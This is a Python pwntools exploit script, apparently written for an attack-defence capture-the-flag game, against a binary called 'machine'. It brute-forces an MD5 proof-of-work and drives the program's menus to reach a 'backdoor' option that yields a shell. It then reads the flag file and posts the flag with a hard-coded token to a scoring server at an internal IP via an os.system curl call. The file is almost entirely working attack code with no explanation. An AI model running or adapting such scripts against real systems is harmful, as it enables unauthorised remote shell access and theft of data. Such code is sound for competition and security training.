from pwn import *
import sys
from hashlib import *

context.log_level = "error"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("machine")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if len(sys.argv) > 1:
    io = remote(sys.argv[1], sys.argv[2])
else:
    io = process("./machine")

def pow():
    io.recvuntil("[+]Proof-Your-Heart:")
    prefix = io.recvuntil("#", drop=True).decode("hex")
    md5value = io.recvuntil("#", drop=True)
    for i1 in range(256):
        for i2 in range(256):
            for i3 in range(256):
                now = chr(i1)+chr(i2)+chr(i3)
                if md5(prefix+now).hexdigest() == md5value:
                    io.sendline(now.encode("hex"))

def main_menu(ix):
    io.sendlineafter("[3]exit\n[+]", str(ix))

def unit_menu(ix):
    main_menu(1)
    io.sendlineafter("[3]k-test\n[4]exit\n[+]", str(ix))

def system_menu(ix):
    main_menu(2)
    io.sendlineafter("[3]k-test\n[4]exit\n[+]", str(ix))

def get_rsa():
    unit_menu(6)
    n = 0xc965c5e17cb28f678986c84ee6e09c57ea69ac9c229b73b26897dafab9e46fc4c553da96e81a7357ca3a782a656cb77b3c17baf17dc12dc900d8a56c4df7dbe2d0116bc7e0f743c3a21bc84cd94a502a96cd0b2d61b86634c7e928619378d23e04e3e3be895c7adbe6083d16c6def0b5bab6df216af3f240444caa711dd89b92124b963afff009ae1e63f5c4c056d3eb1920a1578ec7a9311f36e492a1c5e3b6d0e9489314662ebc95cd8aba21414704b7e5f30f1add066b8f0f8d4186113b82473b8850ad1d3db7442ea97166141989e0d5a90f6bfe522e64f65f74f90646da5781c86a25da1ff519e7537796b798344196ce3896d6ed84efbba347a7800f3b
    e = 0x10001
    io.recvuntil("[+]c:")
    c = int(io.recvline().strip(), 16)
    return n,e,c

def get_rsa2():
    system_menu(6)
    n = 0xc965c5e17cb28f678986c84ee6e09c57ea69ac9c229b73b26897dafab9e46fc4c553da96e81a7357ca3a782a656cb77b3c17baf17dc12dc900d8a56c4df7dbe2d0116bc7e0f743c3a21bc84cd94a502a96cd0b2d61b86634c7e928619378d23e04e3e3be895c7adbe6083d16c6def0b5bab6df216af3f240444caa711dd89b92124b963afff009ae1e63f5c4c056d3eb1920a1578ec7a9311f36e492a1c5e3b6d0e9489314662ebc95cd8aba21414704b7e5f30f1add066b8f0f8d4186113b82473b8850ad1d3db7442ea97166141989e0d5a90f6bfe522e64f65f74f90646da5781c86a25da1ff519e7537796b798344196ce3896d6ed84efbba347a7800f3b
    e = 0x10001
    io.recvuntil("[+]c:")
    c1 = int(io.recvline().strip(),16)
    io.recvuntil("[+]c:")
    c2 = int(io.recvline().strip(), 16)
    return n,e,c1,c2

def k_test(id, content):
    main_menu(id)
    io.sendlineafter("[3]k-test\n[4]exit\n[+]", str(3))
    io.sendlineafter("[+]", content)

def encrypt(id):
    main_menu(id)
    io.sendlineafter("[3]k-test\n[4]exit\n[+]", str(2))

def backdoor(id, content):
    main_menu(id)
    io.sendlineafter("[3]k-test\n[4]exit\n[+]", str(5))
    io.sendlineafter("don't patch this!)", content)

token = "NAvGwfCAQz6WrWrk4XvjQSBE8QFe43ek8q24TbFtbM9TknM2CNXMkuT42TbuvYMu2kjdxU3AbGE"
def submit(flag):
	os.system('curl http://10.66.20.50:9000/submit_flag/ -d "flag={flag}&token={token}"'.format(flag = flag,token = token))
	#print post(url, headers={"Cookie": cookie}, data={"flag" : flag}).text


context.log_level = "debug"
pow()
unit_menu(1)
system_menu(1)

for i in range(5):
    k_test(2, "3"*0x80)
    get_rsa2()
backdoor(2, "0"*0x80)
io.sendline("echo test_test")
io.sendline("cat flag")
#io.interactive()
io.recvuntil("test_test\n")
flag = io.recvline().strip()
submit(flag)
io.interactive()
